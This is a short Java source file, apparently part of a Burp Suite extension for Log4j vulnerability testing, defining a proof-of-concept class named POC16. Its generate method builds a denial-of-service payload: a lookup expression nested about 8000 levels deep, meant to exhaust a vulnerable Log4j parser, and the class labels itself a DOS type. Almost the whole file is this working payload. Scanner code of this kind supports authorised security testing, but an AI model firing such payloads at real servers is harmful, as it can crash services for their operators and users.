package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC16 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${" + "${::-".repeat(8000) + "$${::-j}" + "}".repeat(8000) + "}";

    }

    @Override
    public int getType() {
        return POC_TYPE_DOS;
    }
}
